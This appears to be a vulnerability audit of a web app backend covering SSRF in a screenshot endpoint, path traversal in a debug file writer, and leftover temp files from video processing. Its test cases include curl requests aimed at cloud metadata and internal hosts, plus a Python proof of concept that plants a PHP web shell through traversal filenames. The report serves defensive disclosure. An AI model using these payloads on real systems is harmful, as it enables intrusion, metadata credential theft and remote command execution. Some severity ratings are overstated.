# VULNERABILITIES

## 1. Server-Side Request Forgery (SSRF) in Screenshot Endpoint

### Vulnerability Name
Server-Side Request Forgery (SSRF)

### Description
The `/api/screenshot` endpoint in `backend/routes/screenshot.py` accepts a URL from user input and makes an HTTP request to capture a screenshot through the ScreenshotOne API. While the code normalizes the URL, it doesn't validate whether the URL points to internal resources or restricted networks. An attacker can exploit this to:

1. Send a POST request to `/api/screenshot` with a malicious URL targeting internal services
2. The server normalizes the URL (adding https:// if needed) but doesn't check if it's pointing to internal resources
3. The server then calls the ScreenshotOne API with this URL
4. ScreenshotOne attempts to access the URL and capture a screenshot
5. The attacker receives information about internal services through the screenshot

### Impact
- **Information Disclosure**: Attackers can capture screenshots of internal web applications, admin panels, or other services not exposed to the internet
- **Internal Network Scanning**: By observing response times and error messages, attackers can map internal network topology
- **Cloud Metadata Access**: In cloud environments, attackers could potentially access metadata endpoints (e.g., AWS EC2 metadata at 169.254.169.254)
- **Bypass of Security Controls**: External screenshot service acts as a proxy to access resources that would normally be blocked

### Vulnerability Rank
High

### Currently Implemented Mitigations
- URL normalization to ensure proper protocol formatting
- Basic error handling for screenshot capture failures

### Missing Mitigations
- No validation against private IP ranges (10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
- No validation against localhost addresses (127.0.0.0/8, ::1)
- No validation against cloud metadata endpoints (169.254.169.254)
- No allowlist of permitted domains
- No rate limiting on the endpoint

### Preconditions
- Attacker needs access to the publicly available instance
- Attacker needs a valid ScreenshotOne API key (provided through the request)
- Target internal services must be accessible from the ScreenshotOne service's network

### Source Code Analysis
Looking at `backend/routes/screenshot.py`, the vulnerable code flow is:

1. **Line 71-72**: The endpoint receives user input directly:
```python
url = request.url
api_key = request.apiKey
```

2. **Line 76**: URL normalization happens but no security validation:
```python
normalized_url = normalize_url(url)
```

3. **Lines 11-36**: The `normalize_url` function only ensures protocol exists but doesn't check for malicious URLs:
```python
def normalize_url(url: str) -> str:
    url = url.strip()
    parsed = urlparse(url)

    if not parsed.scheme:
        url = f"https://{url}"
    # ... more protocol handling but no security checks
    return url
```

4. **Line 79**: The normalized URL is passed directly to the screenshot service:
```python
image_bytes = await capture_screenshot(normalized_url, api_key=api_key)
```

5. **Lines 44-67**: The `capture_screenshot` function sends the URL to ScreenshotOne API without validation:
```python
params = {
    "access_key": api_key,
    "url": target_url,  # User-controlled URL passed here
    # ... other params
}
response = await client.get(api_base_url, params=params)
```

### Security Test Case

**Test Setup:**
1. Deploy the application on a cloud instance (e.g., AWS EC2)
2. Ensure the instance has access to internal services or metadata endpoints

**Test Steps:**

1. **Test 1 - Access Cloud Metadata:**
```bash
curl -X POST https://[instance-url]/api/screenshot \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://169.254.169.254/latest/meta-data/",
    "apiKey": "[valid-screenshotone-api-key]"
  }'
```

2. **Test 2 - Access Internal Network:**
```bash
curl -X POST https://[instance-url]/api/screenshot \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://192.168.1.1/admin",
    "apiKey": "[valid-screenshotone-api-key]"
  }'
```

3. **Test 3 - Access Localhost Services:**
```bash
curl -X POST https://[instance-url]/api/screenshot \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://localhost:8080/internal-dashboard",
    "apiKey": "[valid-screenshotone-api-key]"
  }'
```

**Expected Results:**
- If vulnerable, the API will return base64-encoded screenshots of internal resources
- The response will contain: `{"url": "data:image/png;base64,[screenshot-data]"}`
- Decoding the base64 data will reveal screenshots of internal services

**Validation:**
- Decode the base64 response to view the captured screenshot
- Check if internal information is visible in the screenshot
- Monitor network logs to confirm requests were made to internal addresses

## 2. Arbitrary File Write via Debug Directory Traversal

### Vulnerability Name
Path Traversal in Debug File Writer

### Description
The `DebugFileWriter` class in `backend/debug/DebugFileWriter.py` creates debug files when `IS_DEBUG_ENABLED` is set to true. The class constructs file paths by joining user-controllable content with the debug directory path without proper sanitization. An attacker who can control the debug mode and influence the filename parameter could potentially write files to arbitrary locations on the filesystem through path traversal.

The vulnerability flow:
1. When debug mode is enabled (`IS_DEBUG_ENABLED=True`), the system creates a DebugFileWriter instance
2. The `write_to_file` method accepts a filename parameter without validation
3. It uses `os.path.join()` to construct the full path, which doesn't prevent path traversal
4. An attacker could potentially inject `../` sequences if they control the filename
5. This could lead to writing files outside the intended debug directory

### Impact
- **Arbitrary File Write**: Attackers could write files to any location writable by the application user
- **Code Execution**: Writing to application directories could lead to code execution (e.g., writing Python files that get imported)
- **Configuration Override**: Overwriting configuration files could compromise application security
- **Denial of Service**: Overwriting critical system files could crash the application

### Vulnerability Rank
High

### Currently Implemented Mitigations
- Debug mode is disabled by default (`IS_DEBUG_ENABLED` defaults to False)
- UUID is used for directory naming to provide some randomization

### Missing Mitigations
- No validation of filename parameter in `write_to_file` method
- No path traversal prevention
- No restrictions on file extensions
- No validation that the final path stays within the debug directory

### Preconditions
- `IS_DEBUG_ENABLED` must be set to True (through environment variable)
- Attacker needs ability to influence the filename parameter passed to `write_to_file`
- The application process must have write permissions to target directories

### Source Code Analysis

Looking at `backend/debug/DebugFileWriter.py`:

1. **Lines 8-10**: Debug mode check:
```python
def __init__(self):
    if not IS_DEBUG_ENABLED:
        return
```

2. **Lines 12-18**: Directory creation with UUID:
```python
self.debug_artifacts_path = os.path.expanduser(
    f"{DEBUG_DIR}/{str(uuid.uuid4())}"
)
os.makedirs(self.debug_artifacts_path, exist_ok=True)
```

3. **Lines 21-26**: Vulnerable file writing method:
```python
def write_to_file(self, filename: str, content: str) -> None:
    try:
        with open(os.path.join(self.debug_artifacts_path, filename), "w") as file:
            file.write(content)
```

The vulnerability is in line 23 where `os.path.join()` doesn't prevent path traversal if `filename` contains `../` sequences.

Looking at usage in `backend/models/claude.py` (lines 211-219):
```python
if IS_DEBUG_ENABLED:
    debug_file_writer.write_to_file(
        f"pass_{current_pass_num - 1}.html",
        debug_file_writer.extract_html_content(response_text),
    )
    debug_file_writer.write_to_file(
        f"thinking_pass_{current_pass_num - 1}.txt",
        response_text.split("</thinking>")[0],
    )
```

While the current usage seems safe, the method itself is vulnerable if called with untrusted input.

### Security Test Case

**Test Setup:**
1. Set environment variable `IS_DEBUG_ENABLED=True`
2. Set `DEBUG_DIR` to a known directory (e.g., `/tmp/debug`)
3. Run the application

**Test Steps:**

1. **Test Path Traversal in Filename:**
```python
# If an attacker could control the filename parameter:
malicious_filename = "../../etc/test_file.txt"
# or
malicious_filename = "../../../var/www/html/shell.php"
```

2. **Proof of Concept Code:**
```python
import os
import sys
sys.path.append('backend')

os.environ['IS_DEBUG_ENABLED'] = 'True'
os.environ['DEBUG_DIR'] = '/tmp/debug'

from debug.DebugFileWriter import DebugFileWriter

# Create debug writer
writer = DebugFileWriter()

# Attempt path traversal
malicious_content = "<?php system($_GET['cmd']); ?>"
writer.write_to_file("../../../tmp/malicious.php", malicious_content)

# Verify file was written outside debug directory
if os.path.exists("/tmp/malicious.php"):
    print("VULNERABLE: File written outside debug directory")
```

**Expected Results:**
- File should be created at `/tmp/malicious.php` instead of within the debug directory
- This confirms path traversal is possible

**Validation:**
```bash
# Check if file exists outside debug directory
ls -la /tmp/malicious.php

# Verify content
cat /tmp/malicious.php
```

Note: While this vulnerability requires debug mode to be enabled and control over the filename parameter (which may not be directly exposed in current code paths), the lack of input validation in a security-sensitive file writing function represents a high-risk vulnerability that could be exploited if the code evolves or if there are undiscovered code paths that allow filename manipulation.

## 3. Path Traversal in Video Processing Temporary File Creation

### Vulnerability Name
Insufficient Path Validation in Video Processing

### Description
The `split_video_into_screenshots` function in `backend/video/utils.py` processes video data URLs and creates temporary files without proper path validation. While the function uses `tempfile.NamedTemporaryFile` which is generally safe, the debugging functionality in `save_images_to_tmp` creates files in predictable locations without sufficient validation. An attacker who can control the video processing flow could potentially exploit race conditions or predictable file paths.

The vulnerability flow:
1. Video data is processed and converted to screenshots
2. When `DEBUG=True`, images are saved to a temporary directory with UUID-based naming
3. The `save_images_to_tmp` function creates files in `/tmp/screenshots_[uuid]/` directory
4. Files are saved with predictable names (`screenshot_0.jpg`, `screenshot_1.jpg`, etc.)
5. No validation ensures files stay within intended directories

### Impact
- **Information Disclosure**: Predictable file paths could allow attackers to access screenshots from other users' video processing
- **Resource Exhaustion**: Temporary files may not be properly cleaned up, leading to disk space exhaustion
- **Race Condition Exploitation**: Predictable paths enable time-of-check to time-of-use (TOCTOU) attacks

### Vulnerability Rank
High

### Currently Implemented Mitigations
- UUID is used for directory naming to add randomization
- `tempfile.NamedTemporaryFile` is used with `delete=True` for video files
- JPEG format is enforced for image saving

### Missing Mitigations
- No cleanup mechanism for debug screenshots
- No validation of file paths before writing
- No file size limits for video processing
- No rate limiting on video processing endpoints
- Debug mode is hardcoded to `True` in production code

### Preconditions
- Debug mode is enabled (currently hardcoded as `DEBUG = True`)
- Attacker needs ability to submit videos for processing
- System must have write access to `/tmp` directory

### Source Code Analysis

Looking at `backend/video/utils.py`:

1. **Line 14**: Debug mode is hardcoded to True:
```python
DEBUG = True
```

2. **Lines 25-27**: Debug saving is always executed when DEBUG is True:
```python
if DEBUG:
    save_images_to_tmp(images)
```

3. **Lines 97-110**: The `save_images_to_tmp` function creates predictable file paths:
```python
def save_images_to_tmp(images: list[Image.Image]):
    # Create a unique temporary directory
    unique_dir_name = f"screenshots_{uuid.uuid4()}"
    tmp_screenshots_dir = os.path.join(tempfile.gettempdir(), unique_dir_name)
    os.makedirs(tmp_screenshots_dir, exist_ok=True)

    for idx, image in enumerate(images):
        # Generate a unique image filename using index
        image_filename = f"screenshot_{idx}.jpg"
        tmp_filepath = os.path.join(tmp_screenshots_dir, image_filename)
        image.save(tmp_filepath, format="JPEG")
```

4. **Lines 62-93**: Video processing creates multiple temporary files:
```python
with tempfile.NamedTemporaryFile(suffix=suffix, delete=True) as temp_video_file:
    # ... video processing
    for i, frame in enumerate(clip.iter_frames()):
        if i % frame_skip == 0:
            frame_image = Image.fromarray(frame)
            images.append(frame_image)
```

### Security Test Case

**Test Setup:**
1. Deploy application with video processing endpoint enabled
2. Ensure `/tmp` directory is accessible
3. Monitor file system for temporary file creation

**Test Steps:**

1. **Test 1 - Submit Large Video for Processing:**
```python
import base64
import requests

# Create a large video data URL (or use actual video)
with open("large_video.mp4", "rb") as f:
    video_data = base64.b64encode(f.read()).decode()
    video_data_url = f"data:video/mp4;base64,{video_data}"

# Submit for processing
response = requests.post(
    "https://[instance-url]/api/process-video",
    json={"video": video_data_url}
)
```

2. **Test 2 - Monitor Temporary Directory:**
```bash
# Watch for created directories
watch -n 1 'ls -la /tmp/screenshots_*/'

# Check disk usage
df -h /tmp

# Look for leftover files after processing
find /tmp -name "screenshots_*" -type d -mtime +1
```

3. **Test 3 - Concurrent Video Processing:**
```python
import concurrent.futures
import requests

def process_video(video_url):
    return requests.post(
        "https://[instance-url]/api/process-video",
        json={"video": video_url}
    )

# Submit multiple videos simultaneously
with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(process_video, video_data_url) for _ in range(10)]
    results = [f.result() for f in futures]
```

**Expected Results:**
- Multiple directories created in `/tmp` with pattern `screenshots_[uuid]`
- Files remain after processing completion (no cleanup)
- Potential disk space exhaustion with large/many videos
- Predictable file naming within directories

**Validation:**
```bash
# Check for accumulation of temporary files
ls -la /tmp/screenshots_*/ | wc -l

# Verify files are not cleaned up
sleep 300  # Wait 5 minutes
ls -la /tmp/screenshots_*/  # Files should still exist

# Check if files are readable by other users
stat /tmp/screenshots_*/screenshot_0.jpg
```

Note: The hardcoded `DEBUG = True` setting means this vulnerability is active in production environments, creating a significant security risk through information disclosure and resource exhaustion.
